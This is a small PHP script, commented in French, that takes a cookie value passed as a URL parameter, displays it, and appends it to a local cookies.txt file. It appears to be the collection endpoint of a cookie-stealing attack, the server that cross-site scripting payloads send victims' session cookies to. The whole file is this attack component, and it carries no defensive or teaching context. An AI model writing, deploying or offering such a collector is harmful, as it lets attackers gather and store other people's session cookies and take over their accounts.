<?php
// Affiche la valeur du cookie passée en GET
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    echo "Cookie : " . htmlspecialchars($cookie); 

    // Enregistre le cookie dans un fichier
    $handle = fopen("cookies.txt", "a");
    if ($handle) {
        fwrite($handle, $cookie . "\n");
        fclose($handle);
    }
} else {
    echo "Aucun cookie reçu.";
}
?>